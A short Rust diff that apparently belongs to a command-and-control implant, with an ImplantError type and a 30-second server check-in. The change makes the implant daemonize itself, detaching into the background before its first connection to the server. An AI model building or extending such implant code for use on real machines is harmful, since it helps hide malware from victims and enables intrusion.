@@ -1,3 +1,4 @@
+use daemonize::Daemonize;
 use std::{thread, time};
 
 // Mods
@@ -15,6 +16,8 @@ pub const PORT: &str = "8080";
 const CHECK_IN_TIME_SECONDS: u64 = 30;
 
 fn main() -> Result<(), errors::ImplantError> {
+    Daemonize::new().start().unwrap();
+
     // Check if server is up and running
     http::connect::initial_connection()?;
 
